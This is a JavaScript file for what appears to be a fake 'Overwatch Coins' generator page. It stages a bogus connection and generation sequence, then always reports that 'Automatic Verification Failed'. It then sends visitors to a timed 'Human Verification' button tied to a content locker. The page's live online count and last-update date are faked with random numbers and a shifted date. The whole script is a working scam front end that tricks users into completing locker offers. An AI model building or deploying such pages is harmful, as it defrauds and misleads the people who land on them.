$(document).ready(function($) {

      ////////////////
      // Resource Names
      ////////////////
      $resource_1_name = "Overwatch Coins";
      $resource_2_name = "League Tokens";

      ////////////////
      // Console Messages
      ////////////////
      $console_message_1 = "Loading...";
      $console_message_2 = "Generating";
      $console_message_3 = "Succesfully Generated";
      $console_message_4 = "Finalizing generation...";
      $console_message_5 = "Performing Verification...";
      $console_message_6 = "Automatic Verification Failed";
      $console_message_7 = "Please Verify Manually";

      ////////////////
      // Resource Values
      ////////////////
      var $resource_1_value_1;
      var $resource_1_value_2;
      var $resource_1_value_3;
      var $resource_1_value_4;
      var $resource_2_value_1;
      var $resource_2_value_2;
      var $resource_2_value_3;
      var $resource_2_value_4;
      // Resource 1
      $resource_1_value_1 = "250000";
      $resource_1_value_2 = "500000";
      $resource_1_value_3 = "750000";
      $resource_1_value_4 = "1000000";
      // Resource 2
      $resource_2_value_1 = "50000";
      $resource_2_value_2 = "100000";
      $resource_2_value_3 = "150000";
      $resource_2_value_4 = "200000";

      ////////////////
      // Human Verification Timer
      ////////////////
      var $human_verification_timer_value = '180'; //Countdown remaing time in seconds	


      ////////////////
      // Platform Select
      ////////////////
      var $platform_icon;
      var $selected_device_option;


      function resetplatformBoxes() {
        var $platform_list = $('.platform-item-1, .platform-item-2, .platform-item-3, .platform-item-4');
        if ($platform_list.hasClass('active')) {
          $platform_list.removeClass('active');
        }
      }
      $('.platform-item').click(function() {
        if ($(this).hasClass('active')) {} else {

        }
        fixplatformBox($(this));
      });

      var $console_username;
      $("#proc-btn-1").click(function() {
        if ("" == $("#player-username").val()) {
          $(".username-wrapper").addClass("shake animated border-b-red").one("webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend", function() {
            $(this).removeClass("shake animated");
          });
        } else {
          "" != $("#player-username").val() && ($console_username = $("#player-username").val(), mFunc());
        }
      });

      const verificationContent = `
	<div class="human-verification-wrapper">
	<h3>Human Verification</h3>
	<p>You are almost done! Click on the Verify Now button below to complete human verification.</p>
	<div class="row small-margin verification-user-info">	
		<div class="col-6 small-padding mx-auto">	
			<div class="connected-player-item animated bounceIn animation-delay-200">
				<div class="connected-label">Username:</div>
				<div class="connected-player-value connected-username-value"></div>
			</div>
		</div>		
	</div>
	<div class="row small-margin verification-user-info">	
		<div class="col-6 small-padding mx-auto">
			<div class="console-generation-item console-generation-item-r-1 animated bounceIn animation-delay-600">
				<img src="img/r-item-1.png" class="resource-select-icon" alt="Resource1"/>
				<div class="console-generation-item-value console-generation-item-value-r-1">0</div>
				<div class="resource-item-label">Overwatch Coins</div>
			</div>
		</div>
	</div>
	<i class="fas fa-spinner fa-spin"></i>
	<div id="h-v-time-left-wrapper" class="h-v-time-left-wrapper">
		<span>Time Left:</span>
		<span id="human_verification_timer_time"></span>
	</div>
	<div class="verification-button-wrapper animated bounceIn animation-delay-1000">
		<a id="verification-button showContentLocker" class="s-btn"><span>Verify Now</span></a>
	</div>
</div>`;

      const consoleContent = `
<div id="master-modal" class="master-modal animated bounceInUp">
	<div class="modal-inner">	
		<div class="modal-title">	
			<img src="img/logo.png" class="img-fluid logo-img animated bounceIn" alt="Logo" />
			<div class="modal-title-content"><span class="lnr lnr-cog fa-spin"></span>Processing...</div>
		</div>
		<div class="modal-content console-content">	
			<div class="loader-wrapper">
				<div class="loader">Loading...</div>
			</div>
			<div class="console-generation-item console-generation-item-r-1">
				<img src="img/r-item-1.png" class="resource-select-icon" alt="Resource1"/>
				<div class="console-generation-item-value console-generation-item-value-r-1">0</div>
				<div class="resource-item-label">Overwatch Coins</div>
			</div>
			<div class="console-msg-wrapper animated pulse infinite">
				<div class="console-msg"></div>
			</div>
			<div class="console-loadbar-wrapper">
				<div id="progressBarConsole" class="console-loadbar animated bounceIn"><div></div></div>
			</div>
		</div>
	</div>
</div>`;

      const connectingContent = `
<div id="master-modal" class="master-modal animated bounceInUp">
	<div class="modal-inner">	
		<div class="modal-title">	
			<img src="img/logo.png" class="img-fluid logo-img animated bounceIn" alt="Logo" />
			<div class="modal-title-content"><span class="lnr lnr-cog fa-spin"></span>Processing...</div>
		</div>
		<div class="modal-content">	
			<div class="loader-wrapper">
				<div class="loader">Loading...</div>
			</div>
			<div class="console-msg-wrapper animated pulse infinite">
				<div class="console-msg">Connecting...</div>
			</div>
			<div class="console-loadbar-wrapper">
				<div id="progressBarConsole" class="console-loadbar animated bounceIn"><div></div></div>
			</div>
		</div>
	</div>
</div>`;


      const resourceoneContent = `
<div class="connected-player-wrapper">	
	<div class="connected-player-content">
		<div class="label connected-success animated bounceIn">Player Connected</div>
		<div class="row small-margin">	
			<div class="col-6 small-padding mx-auto">	
				<div class="connected-player-item animated bounceIn animation-delay-200">
					<div class="connected-label">Username:</div>
					<div class="connected-player-value connected-username-value"></div>
				</div>
			</div>	
			
		</div>
	</div>
</div>
<div class="resource-select-wrapper">	
	<div class="resource-one-wrapper">
		<div class="animated bounceIn animation-delay-600">
			<div class="label">Amount of Overwatch Coins</div>
		</div>
		<div class="row small-margin">	
			<div class="col-6 small-padding">	
				<div class="animated bounceIn animation-delay-800">
					<div class="resource-select-item resource-select-item-one resource-select-item-1">
						<img src="img/r-item-1.png" class="resource-select-icon" alt="Resource1"/>
						<div class="resource-item-value resource-item-one-value resource-item-value-1"></div>
						<div class="resource-item-label">Overwatch Coins</div>
					</div>
				</div>
			</div>
			<div class="col-6 small-padding">	
				<div class="animated bounceIn animation-delay-1000">
					<div class="resource-select-item resource-select-item-one resource-select-item-2">
						<img src="img/r-item-1.png" class="resource-select-icon" alt="Resource1"/>
						<div class="resource-item-value resource-item-one-value resource-item-value-2"></div>
						<div class="resource-item-label">Overwatch Coins</div>
					</div>
				</div>
			</div>
			<div class="col-6 small-padding">	
				<div class="animated bounceIn animation-delay-1200">
					<div class="resource-select-item resource-select-item-one resource-select-item-3">
						<img src="img/r-item-1.png" class="resource-select-icon" alt="Resource1"/>
						<div class="resource-item-value resource-item-one-value resource-item-value-3"></div>
						<div class="resource-item-label">Overwatch Coins</div>
					</div>
				</div>
			</div>	
			<div class="col-6 small-padding">	
				<div class="animated bounceIn animation-delay-1400">
					<div class="resource-select-item resource-select-item-one resource-select-item-4">
						<img src="img/r-item-1.png" class="resource-select-icon" alt="Resource1"/>
						<div class="resource-item-value resource-item-one-value resource-item-value-4"></div>
						<div class="resource-item-label">Overwatch Coins</div>
					</div>
				</div>
			</div>	
		</div>
	</div>
</div>`;

      function mFunc() {

        $(".modal-outer").html(connectingContent).hide().fadeIn();
        $.magnificPopup.open({
          items: {
            src: "#master-modal",
          },
          type: "inline",
          preloader: !1,
          modal: !0,
          fixedContentPos: !0,
          fixedBgPos: !0,
          callbacks: {
            open: function() {
              function c(d, e, a) {
                var b = d * e.width() / 100;
                e.find("div").animate({
                  width: b
                }, a).html(d + "%&nbsp;");
              }
              c(0, $("#progressBarConsole"), 1);
              c(100, $("#progressBarConsole"), 3200);
              setTimeout(function() {
                $.magnificPopup.close();
                $(".generator-content").html(resourceoneContent).hide().fadeIn();
                $(".connected-username-value").html($console_username);
                $(".connected-device-value").html($platform_icon + $selected_device_option);
                $(".resource-item-one-value.resource-item-value-1").html($resource_1_value_1);
                $(".resource-item-one-value.resource-item-value-2").html($resource_1_value_2);
                $(".resource-item-one-value.resource-item-value-3").html($resource_1_value_3);
                $(".resource-item-one-value.resource-item-value-4").html($resource_1_value_4);
                $(".resource-select-item-one").click(function() {
                  $(this).hasClass("resource-select-item-1") ? $selected_amount_r1 = $resource_1_value_1 : $(this).hasClass("resource-select-item-2") ? $selected_amount_r1 = $resource_1_value_2 : $(this).hasClass("resource-select-item-3") ? $selected_amount_r1 = $resource_1_value_3 : $(this).hasClass("resource-select-item-4") && ($selected_amount_r1 = $resource_1_value_4);
                  $(".resource-one-wrapper .label").addClass("animated fadeOutUp").one("webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend", function() {
                    $(this).hide();
                  });
                  $(".resource-select-item-1").addClass("animated fadeOutDown").one("webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend", function() {
                    $(this).hide();
                  });
                  setTimeout(function() {
                    $(".resource-select-item-2").addClass("animated fadeOutDown").one("webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend", function() {
                      $(this).hide();
                    });
                  }, 150);
                  setTimeout(function() {
                    $(".resource-select-item-3").addClass("animated fadeOutDown").one("webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend", function() {
                      $(this).hide();
                    });
                  }, 300);
                  setTimeout(function() {
                    $(".resource-select-item-4").addClass("animated fadeOutDown").one("webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend", function() {
                      $(this).hide();
                    });
                  }, 450);
                      setTimeout(function() {
                        $(".modal-outer").html(consoleContent).hide().fadeIn();
                        $.magnificPopup.open({
                          items: {
                            src: "#master-modal",
                          },
                          type: "inline",
                          preloader: !1,
                          modal: !0,
                          fixedContentPos: !0,
                          fixedBgPos: !0,
                          callbacks: {
                            open: function() {
                              c(0, $("#progressBarConsole"), 1);
                              c(100, $("#progressBarConsole"), 14500);
                              $console_message = ".console-msg";
                              $($console_message).html($console_message_1);
                              $($console_message).addClass("animated bounceIn").one("webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend", function() {
                                $(this).removeClass("animated bounceIn");
                              });
                              setTimeout(function() {
                                $($console_message).html($console_message_2 + ' <span class="console-msg-resource">' + $selected_amount_r1 + "</span> " + $resource_1_name);
                                $($console_message).addClass("animated bounceIn").one("webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend", function() {
                                  $(this).removeClass("animated bounceIn");
                                });
                                $(".loader-wrapper").fadeOut(function() {
                                  $(".console-generation-item-r-1").fadeIn();
                                  $(".console-generation-item-r-1").addClass("animated bounceIn").one("webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend", function() {
                                    $(this).removeClass("animated bounceIn");
                                  });
                                  $(".console-generation-item-value-r-1").countTo({
                                    from: 0,
                                    to: $selected_amount_r1,
                                    speed: 2500,
                                    refreshInterval: 5,
                                    formatter: function(a, b) {
                                      return a.toFixed(b.decimals);
                                    },
                                    onComplete: function(a, b) {}
                                  });
                                });
                              }, 2000);
                              setTimeout(function() {
                                $($console_message).html('<span class="console-msg-completed">' + $console_message_3 + "</span> ");
                                $($console_message).addClass("animated bounceIn").one("webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend", function() {
                                  $(this).removeClass("animated bounceIn");
                                });
                                $(".console-generation-item-r-1").addClass("animated jello item-completed").one("webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend", function() {
                                  $(this).removeClass("animated jello");
                                });
                              }, 5000);
                              setTimeout(function() {
                                $(".console-generation-item-r-1").fadeOut(function() {
                                  $(".loader-wrapper").fadeIn();
                                  $($console_message).html($console_message_4);
                                  $($console_message).addClass("animated bounceIn").one("webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend", function() {
                                    $(this).removeClass("animated bounceIn");
                                  });
                                });
                              }, 7000);
                              setTimeout(function() {
                                $($console_message).html($console_message_5);
                                $($console_message).addClass("animated bounceIn").one("webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend", function() {
                                  $(this).removeClass("animated bounceIn");
                                });
                              }, 9000);
                              setTimeout(function() {
                                $(".loader-wrapper").html('<span class="lnr lnr-cross-circle console-msg-failed animated bounceIn"></span>');
                                $($console_message).html('<span class="console-msg-failed">' + $console_message_6 + "</span>");
                                $($console_message).addClass("animated bounceIn").one("webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend", function() {
                                  $(this).removeClass("animated bounceIn");
                                });
                              }, 11000);
                              setTimeout(function() {
                                $(".loader-wrapper").html('<span class="lnr lnr-warning animated bounceIn"></span>');
                                $($console_message).html($console_message_7);
                                $($console_message).addClass("animated bounceIn").one("webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend", function() {
                                  $(this).removeClass("animated bounceIn");
                                });
                              },13000);
                              setTimeout(function() {
                                $(".master-modal").html(verificationContent).hide().fadeIn();
                                $(".connected-username-value").html($console_username);
                                $(".connected-device-value").html($platform_icon + $selected_device_option);
                                $(".console-generation-item-value-r-1").html($selected_amount_r1);
                                human_verification_timer.init($human_verification_timer_value);
                              }, 15500);
                            }
                          }
                        });
                      }, 600);
                    });
                });
            }
          }
        });
      };
    });
    ////////////////
    // Status - Online Count
    ////////////////
    var starting_number = 150;
    var random;

    function online_count() {
      document.getElementById("online-count").innerHTML = starting_number;
      var randCalc = Math.floor(Math.random() * 10 + 1);
      if (randCalc <= 5) {
        starting_number = starting_number + Math.floor(Math.random() * 10 + 1);;
      } else {
        starting_number = starting_number - Math.floor(Math.random() * 10 + 1);;
      }
      random = setTimeout("online_count()", 1000);
    }
    online_count();

    ////////////////
    // Status - Last Update
    ////////////////
    document.getElementById("date").innerHTML = formatAMPM();
    function formatAMPM() {
      var d = new Date(),
        currentDate = new Date();
        currentDate.setDate(currentDate.getDate() - 3);
        day = currentDate.getDate();
        month = currentDate.getMonth();
        year = currentDate.getFullYear();
        months = ['Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec'];
        return months[month] + ' ' + day + ' ' + year + ' ';
    }
    var human_verification_timer = function() {
      var time_left = 15;
      var keep_counting = 1;
      var time_out_msg = 'few seconds';

      function countdown() {
        if (time_left < 2) {
          keep_counting = 0;
        }
        time_left = time_left - 1;
      }

      function add_leading_zero(n) {
        if (n.toString().length < 2) {
          return '0' + n;
        } else {
          return n;
        }
      }

      function format_output() {
        var hours, minutes, seconds;
        seconds = time_left % 60;
        minutes = Math.floor(time_left / 60) % 60;
        hours = Math.floor(time_left / 3600);
        seconds = add_leading_zero(seconds);
        minutes = add_leading_zero(minutes);
        hours = add_leading_zero(hours);
        return minutes + ' minutes and ' + seconds + ' seconds';
      }

      function timer_time_left() {
        document.getElementById('human_verification_timer_time').innerHTML = '<span>' + format_output() + '</span>';
      }

      function no_time_left() {
        document.getElementById('human_verification_timer_time').innerHTML = time_out_msg;
      }
      return {
        count: function() {
          countdown();
          timer_time_left();
        },
        timer: function() {
          human_verification_timer.count();
          if (keep_counting) {
            setTimeout("human_verification_timer.timer();", 1000);
          } else {
            no_time_left();
          }
        },
        init: function(n) {
          time_left = n;
          human_verification_timer.timer();
        }
      };
    }();

    ////////////////
    // Verification Timer
    ////////////////
    var human_verification_timer = function() {
      function c(a) {
        return 2 > a.toString().length ? "0" + a : a;
      }
      var b = 15,
        f = 1;
      return {
        count: function() {
          2 > b && (f = 0);
          --b;
          var a = document.getElementById("human_verification_timer_time");
          var d = b % 60;
          var e = Math.floor(b / 60) % 60;
          var g = Math.floor(b / 3600);
          d = c(d);
          e = c(e);
          c(g);
          a.innerHTML = "<span>" + (e + " minutes and " + d + " seconds</span>");
        },
        timer: function() {
          human_verification_timer.count();
          f ? setTimeout("human_verification_timer.timer();", 1000) : document.getElementById("human_verification_timer_time").innerHTML = "few seconds";
        },
        init: function(a) {
          b = a;
          human_verification_timer.timer();
        }
      };
    }();